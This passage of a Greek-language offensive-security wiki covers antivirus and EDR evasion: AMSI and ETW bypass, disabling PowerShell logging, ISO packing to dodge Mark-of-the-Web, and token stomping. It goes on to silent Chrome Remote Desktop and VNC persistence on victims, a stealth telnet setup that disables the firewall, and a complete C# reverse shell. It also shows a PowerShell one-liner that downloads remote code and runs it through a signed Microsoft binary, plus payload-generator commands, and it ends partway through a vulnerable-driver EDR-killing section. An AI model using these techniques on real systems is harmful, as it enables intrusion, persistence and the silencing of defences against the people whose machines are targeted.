Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για bypass του AMSI, το οποίο αποφεύγει το signature μέσω randomized user-defined functions, variables και character expressions, ενώ εφαρμόζει random character casing στα keywords του PowerShell για την αποφυγή του signature.

**Αφαίρεση του detected signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το detected AMSI signature από τη μνήμη της τρέχουσας process. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας process για το AMSI signature και στη συνέχεια αντικαθιστώντας το με NOP instructions, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## Καταγραφή PS

Η καταγραφή PowerShell είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση PowerShell Transcription και Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα tool όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση Unmanaged Powershell Session**: Χρησιμοποιήστε το [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να κάνετε spawn ένα powershell χωρίς defenses (αυτό χρησιμοποιεί το `powerpick` από το Cobal Strike).


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει το entropy του binary και διευκολύνει τον εντοπισμό του από AVs και EDRs. Να είστε προσεκτικοί και ίσως εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή commercial forks), είναι συνηθισμένο να αντιμετωπίζετε αρκετά επίπεδα προστασίας που μπλοκάρουν decompilers και sandboxes. Η παρακάτω διαδικασία **επαναφέρει ένα σχεδόν αρχικό IL**, το οποίο στη συνέχεια μπορεί να γίνει decompile σε C# με tools όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης τροποποιεί το PE checksum, επομένως οποιαδήποτε αλλαγή θα προκαλέσει crash στο binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους metadata tables, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 anti-tamper παραμέτρους (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση Symbol / control-flow – Δώστε το *clean* file στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλογή του ConfuserEx 2 profile
• Το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και variable names και θα αποκρυπτογραφήσει τα constant strings.

3.  Αφαίρεση Proxy-call – Το ConfuserEx αντικαθιστά τις direct method calls με lightweight wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα, θα πρέπει να παρατηρείτε κανονικά .NET APIs, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – Εκτελέστε το resulting binary στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *real* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς να χρειάζεται να εκτελέσετε το malicious sample** – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη αρχική ταξινόμηση δειγμάτων.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite, ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιείται η γλώσσα `C++11/14` για τη δημιουργία obfuscated code κατά το compile time, χωρίς τη χρήση εξωτερικού tool και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που δημιουργούνται από το C++ template metaprogramming framework, γεγονός που κάνει τη ζωή του ατόμου που θέλει να κάνει crack στην εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα pe files, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages, που χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code, μετασχηματίζοντας τις κανονικές εντολές σε ROP chains και αποτρέποντας τη φυσική μας αντίληψη για τη φυσιολογική ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτή την οθόνη κατά τη λήψη ορισμένων executables από το internet και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που έχει σχεδιαστεί για να προστατεύει τον end user από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με προσέγγιση βασισμένη στη reputation, δηλαδή εφαρμογές που κατεβαίνουν σπάνια θα ενεργοποιήσουν το SmartScreen, προειδοποιώντας και εμποδίζοντας τον end user να εκτελέσει το file (παρότι το file μπορεί να εκτελεστεί κάνοντας κλικ στα More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη files από το internet, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα file που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables που έχουν υπογραφεί με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που συσκευάζει payloads σε output containers, ώστε να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO, χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός logging στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα system components να **καταγράφουν events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως το AMSI μπορεί να απενεργοποιηθεί (να γίνει bypass), είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** της user space process να επιστρέφει αμέσως χωρίς να καταγράφει events. Αυτό γίνεται με patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά το ETW logging για τη συγκεκριμένη process.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Το loading C# binaries στη μνήμη είναι γνωστό εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο για την εκτέλεση των post-exploitation tools σας χωρίς να εντοπίζεστε από το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα πρέπει να ανησυχούμε μόνο για το patching του AMSI για ολόκληρη τη process.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει το **spawning μιας νέας sacrificial process**, το injecting του post-exploitation malicious code σας σε αυτήν τη νέα process, την εκτέλεση του malicious code και, όταν ολοκληρωθεί, το killing της νέας process. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση πραγματοποιείται **εκτός** της Beacon implant process μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια του post-exploitation action, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για injecting του post-exploitation malicious code **στη δική του process**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία μιας νέας process και το scanning της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** σας, καθώς μπορεί να προκληθεί crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να κάνετε load C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [video του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες, παρέχοντας στο compromised machine πρόσβαση **στο interpreter environment που είναι εγκατεστημένο στο Attacker Controlled SMB share**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο environment μέσω του SMB share, μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.

Το repo αναφέρει: Το Defender εξακολουθεί να κάνει scan στα scripts, αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία για την παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Το token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **χειραγωγήσει το access token ή ένα security product, όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges του, ώστε η process να μην τερματιστεί, αλλά να μην έχει permissions για τον έλεγχο malicious activities.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν external processes** από το να αποκτούν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να κάνετε deploy το Chrome Remote Desktop σε έναν victim's PC και στη συνέχεια να το χρησιμοποιήσετε για να κάνετε takeover και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από το https://remotedesktop.google.com/, κάντε click στο "Set up via SSH" και, στη συνέχεια, κάντε click στο MSI file για Windows, ώστε να κατεβάσετε το MSI file.
2. Εκτελέστε σιωπηλά τον installer στον victim (απαιτούνται admin privileges): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε click στο next. Ο wizard θα σας ζητήσει στη συνέχεια authorization. Κάντε click στο Authorize button για να συνεχίσετε.
4. Εκτελέστε την ακόλουθη parameter με τις απαραίτητες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε το pin param, το οποίο επιτρέπει τον ορισμό του pin χωρίς τη χρήση του GUI).


## Advanced Evasion

Το Evasion είναι ένα πολύ σύνθετο θέμα. Μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο system, επομένως είναι πρακτικά αδύνατο να παραμείνετε εντελώς undetected σε mature environments.

Κάθε environment εναντίον του οποίου επιχειρείτε θα έχει τα δικά του strengths και weaknesses.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα σχετικά με πιο Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί malicious το Defender** και θα σας το διαχωρίσει.\
Ένα ακόμη tool που κάνει **το ίδιο είναι το** [**avred**](https://github.com/dobin/avred), με open web offering της υπηρεσίας στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το να **ξεκινά** κατά την εκκίνηση του συστήματος και **εκτελέστε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεστε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα στο** host του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Ξεκινήστε το winvnc daemon `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε ορισμένα πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **εκκινήστε το lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# με χρήση compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης της Python για τη δημιουργία injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από το Kernel Space

Το Storm-2603 αξιοποίησε ένα μικρό console utility, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoints πριν από την ανάπτυξη ransomware. Το tool φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για την εκτέλεση προνομιούχων kernel operations, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV που εκτελούνται ως Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Signed driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι στην πραγματικότητα ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργοποιημένο.
2. **Εγκατάσταση service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs που εκθέτει ο driver**
